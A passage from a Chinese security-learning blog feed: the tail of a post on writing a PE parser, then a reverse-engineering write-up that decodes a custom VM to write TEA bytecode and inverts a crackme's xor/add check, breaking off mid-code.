class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(fbuffer);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>-s -t 模式打印节区和两张表；</p><p><img src="https://s2.loli.net/2022/11/12/xzwolNHZFephGKX.png" alt="end?"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>只能说，纯手撸会有些不完善的bug，逻辑上和测试上是没问题的，有些偏移有问题，用微软自带的结构体应该是能解决这个毛病的，而且更好写，想用什么内容直接指就行了；</p><p>没有模块化也是bug模糊的问题之一；</p><p>写下来对PE有更深刻的理解；</p><p><img src="https://s2.loli.net/2022/11/12/tsp7CmQUhZd6nRI.png" alt="genshin"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;了解PE的结构：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31967907&quot;&gt;https://zhuanlan.zhihu.com/p/31967907&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;作为练手的记录, 学习性不是很强；&lt;/p&gt;
&lt;p&gt;记录一些术</summary>
      
    
    
    
    <category term="Lab" scheme="https://secondbc.github.io/SecondBC/categories/Lab/"/>
    
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>2022-syc-bin二面</title>
    <link href="https://secondbc.github.io/SecondBC/2022/11/06/2022-syc-bin%E4%BA%8C%E9%9D%A2/"/>
    <id>https://secondbc.github.io/SecondBC/2022/11/06/2022-syc-bin%E4%BA%8C%E9%9D%A2/</id>
    <published>2022-11-06T04:58:16.000Z</published>
    <updated>2022-11-06T05:02:50.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote><p>逆向一个虚拟机，编写适应于其的二进制文件，实现tea算法；</p></blockquote><p><img src="https://s2.loli.net/2022/10/31/XlNWK2jqOH4iMDv.png" alt="main"></p><p>上图左侧为main函数，逻辑就是读取名称 “binary” 的内容，然后将其赋给code，之后将code扔进vm函数充当指令集；</p><p>每条指令分三个数值，一个指令数，两个操作数，分别给了instru和One，Two变量；</p><p>根据输入不同的instru变量来调用不同的函数，这些函数就是指令执行的操作了，翻译如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">code[<span class="number">8</span>] 是计数器 -&gt; i</span><br><span class="line"></span><br><span class="line">code[<span class="number">9</span>] 是flag 控制数</span><br><span class="line"></span><br><span class="line">code[<span class="number">7</span>] 是栈针</span><br><span class="line"></span><br><span class="line">code[<span class="number">6</span>] 用于实现加法</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">    </span><br><span class="line"><span class="number">0</span> code[one] = two ++i</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = one ++code[<span class="number">7</span>]++i</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = code[one]++code[<span class="number">7</span>]++i</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = code[<span class="number">8</span>] + <span class="number">1</span>++code[<span class="number">7</span>]code[<span class="number">8</span>] = one</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> code[one] = code[two]++i</span><br><span class="line"></span><br><span class="line"><span class="number">5</span> code[<span class="number">8</span>] = one</span><br><span class="line"></span><br><span class="line"><span class="number">6</span> code[one + <span class="number">10</span> + code[<span class="number">6</span>]] += code[two] ++i</span><br><span class="line"></span><br><span class="line"><span class="number">7</span> code[one] = code[code[<span class="number">6</span>] + <span class="number">10</span> + two]++i</span><br><span class="line"></span><br><span class="line"><span class="number">8</span> code[one] &lt; &lt; = two++i</span><br><span class="line"></span><br><span class="line"><span class="number">9</span> code[one] &gt; &gt; = two++i</span><br><span class="line"></span><br><span class="line">a code[one] += code[two + <span class="number">10</span> + code[<span class="number">6</span>]]++i</span><br><span class="line"></span><br><span class="line">b code[one] ^= code[two]++i</span><br><span class="line"></span><br><span class="line">c <span class="keyword">if</span>( !code[<span class="number">9</span>] ) -&gt; code[<span class="number">8</span>] = one ; <span class="keyword">else</span> ++i</span><br><span class="line"></span><br><span class="line">d end</span><br><span class="line"></span><br><span class="line">e <span class="keyword">if</span>(two &lt; = code[one + <span class="number">10</span> + code[<span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">​&#123;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">if</span>(two = code[one + <span class="number">10</span> + code[<span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">​code[<span class="number">9</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">​<span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">​code[<span class="number">9</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">else</span> -&gt; code[<span class="number">9</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">​++i</span><br><span class="line"></span><br><span class="line">f --code[<span class="number">7</span>]code[one] = code[code[<span class="number">7</span>] + <span class="number">10</span>] ++i</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> --code[<span class="number">7</span>]code[<span class="number">8</span>] = code[code[<span class="number">7</span>] + <span class="number">10</span>] ++i</span><br><span class="line"></span><br><span class="line"><span class="number">11</span> code[code[<span class="number">6</span>] + <span class="number">10</span> + one] += two++i</span><br><span class="line"></span><br><span class="line"><span class="number">12</span> code[code[<span class="number">6</span>] + <span class="number">10</span> + one] += code[code[<span class="number">6</span>] + <span class="number">10</span> + two]   ++i</span><br><span class="line"></span><br><span class="line"><span class="number">13</span> code[one] = cin++i</span><br><span class="line"></span><br><span class="line"><span class="number">14</span> cout code[one]   ++i</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">所以<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>都表示入栈，<span class="number">3</span>表示call因为改变了计数器；f，<span class="number">10</span>表示出栈，<span class="number">10</span>表示<span class="keyword">return</span>；</span><br></pre></td></tr></table></figure><p> 由此对照机械码手撸汇编：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//赋初值</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span><span class="number">6</span> <span class="number">32</span>mov reg6, <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="number">11223344</span>push <span class="number">11223344</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="number">22334455</span>push <span class="number">22334455</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="number">33445566</span>push <span class="number">33445566</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="number">44556677</span>push <span class="number">44556677</span>h</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环输入</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="number">0</span> <span class="number">0</span>add reg60, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">tag1:</span><br><span class="line"></span><br><span class="line"><span class="number">13</span><span class="number">0</span>mov reg0, cin</span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="number">0</span>push [reg0]</span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="number">0</span> <span class="number">1</span>add reg60, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e<span class="number">0</span> <span class="number">4</span>cmp reg60, <span class="number">4</span></span><br><span class="line"></span><br><span class="line">c<span class="number">43</span>jnztag1</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用cry以及输出</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="number">4</span>Ecall cry</span><br><span class="line"></span><br><span class="line"><span class="number">14</span><span class="number">0</span>mov cout, reg0</span><br><span class="line"></span><br><span class="line"><span class="number">14</span><span class="number">1</span>mov cout, reg1</span><br><span class="line"></span><br><span class="line"><span class="number">14</span><span class="number">2</span>mov cout, reg2</span><br><span class="line"></span><br><span class="line"><span class="number">14</span><span class="number">3</span>mov cout, reg3</span><br><span class="line"></span><br><span class="line">dretn</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//cry实现</span></span><br><span class="line"></span><br><span class="line">cry:</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="number">9E3779</span><span class="function">B9push<span class="title">delta</span><span class="params">(push后code[<span class="number">7</span>] = <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// v[4]</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">40 Emov reg0, [esp + 6]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">41 Fmov reg1, [esp + 5]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">42 10mov reg2, [esp + 4]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">43 11mov reg3, [esp + 3]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">03C 0mov reg60, 0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">110 0add reg60, 0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">tag2:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//sum</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">1</span> <span class="number">13</span>add reg61, [esp + <span class="number">2</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3</span>E <span class="number">1</span>mov reg62, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span><span class="number">3</span>E <span class="number">4</span>shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">2</span> Aadd reg62, [esp + a]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3F</span> <span class="number">1</span>mov reg63, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">3</span> <span class="number">3</span>Dadd reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">40</span> <span class="number">1</span>mov reg64, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span><span class="number">40</span> <span class="number">5</span>shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">4</span> Badd reg64, [esp + <span class="number">9</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b<span class="number">3</span>E <span class="number">3F</span>xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b<span class="number">3</span>E <span class="number">40</span>xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">2</span> <span class="number">0</span>add reg62, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">0</span> <span class="number">3</span>Emov reg0,  reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3</span>E <span class="number">0</span>mov reg62, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span><span class="number">3</span>E <span class="number">4</span>shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">2</span> Cadd reg62, [esp + <span class="number">8</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3F</span> <span class="number">0</span>mov reg63, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">3</span> <span class="number">3</span>Dadd reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">40</span> <span class="number">0</span>mov reg64, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span><span class="number">40</span> <span class="number">5</span>shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">4</span> Dadd reg64, [esp + <span class="number">7</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b<span class="number">3</span>E <span class="number">3F</span>xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b<span class="number">3</span>E <span class="number">40</span>xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">2</span> <span class="number">1</span>add reg62, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">1</span> <span class="number">3</span>Emov reg1 reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3</span>E <span class="number">3</span>mov reg62, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span><span class="number">3</span>E <span class="number">4</span>shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">2</span> Aadd reg62, [esp + a]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3F</span> <span class="number">3</span>mov reg63, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">3</span> <span class="number">3</span>Dadd reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">40</span> <span class="number">3</span>mov reg64, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span><span class="number">40</span> <span class="number">5</span>shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">4</span> Badd reg64, [esp + <span class="number">9</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b<span class="number">3</span>E <span class="number">3F</span>xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b<span class="number">3</span>E <span class="number">40</span>xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">2</span> <span class="number">2</span>add reg62, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">2</span> <span class="number">3</span>Emov reg2 reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3</span>E <span class="number">2</span>mov reg62, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span><span class="number">3</span>E <span class="number">4</span>shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">2</span> Cadd reg62, [esp + <span class="number">8</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3F</span> <span class="number">2</span>mov reg63, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">3</span> <span class="number">3</span>Dadd reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">40</span> <span class="number">2</span>mov reg64, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span><span class="number">40</span> <span class="number">5</span>shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">4</span> Dadd reg64, [esp + <span class="number">7</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b<span class="number">3</span>E <span class="number">3F</span>xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b<span class="number">3</span>E <span class="number">40</span>xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span><span class="number">2</span> <span class="number">3</span>add reg62, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span><span class="number">3</span> <span class="number">3</span>Emov reg3,  reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">11</span><span class="number">0</span> <span class="number">1</span>add reg60, <span class="number">1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">e<span class="number">0</span> <span class="number">20</span>cmp reg60, <span class="number">32</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">c<span class="number">55</span>jnztag2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">f<span class="number">13</span>pop delta</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">10</span>retn</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>没实现栈平衡，不过芜锁胃；反正最后return回去输出就行；</p><p>注意：写二进制文件时用小端序，而且以DWORD为基本单位，并以3个DWORD对齐，比如 <code>c 55</code> 写成：<code>0c 00 00 00 55 00 00 00 00 00 00 00</code> ;</p><p>还有个问题，根据调试，每次第一条指令开始是code[8] = 3C; 所以二进制文件需要填充垃圾信息，填多少？第一幅图中instru = code[3 * code[8] + 1010], 所以 括号里的内容为 ： 1190 ；而写二进制文件需要以DWORD为单位，所以需要填充 1190 * 4 个 00 ；</p><p>通过：</p><p><img src="https://s2.loli.net/2022/10/31/p5qd2NZMrHelwa3.png" alt="pass"></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>ida：</p><p><img src="https://s2.loli.net/2022/11/01/X83ejBp4Tx6KRGE.png" alt="main"></p><p>调试可以发现main挂不上，然后就发现旁边的函数长得和main都差不多，一个一个断点试，找到第三个是真正的main函数；</p><p>主要思路就是输入15个内容，进行异或和加运算，然后和v4开始的数据比较；</p><p>写出逆运算：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> buf[<span class="number">15</span>] = &#123;</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x46</span>, <span class="number">0x81</span>, <span class="number">0x63</span>, <span class="number">0x14</span>, <span class="number">0x53</span>, <span class="number">0x17</span>, <span class="number">0x6D</span>, <span class="number">0x6A</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0x16</span>, <span class="number">0x34</span>, <span class="number">0x14</span>, <span class="number">0x34</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> ans[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i)<span class="comment">//自加v0到加密完状态</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            v0++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v0--;<span class="comment">//多加一个减掉</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">14</span>; i &gt;= <span class="number">0</span>; --i)<span class="comment">//逆</span></span><br><span 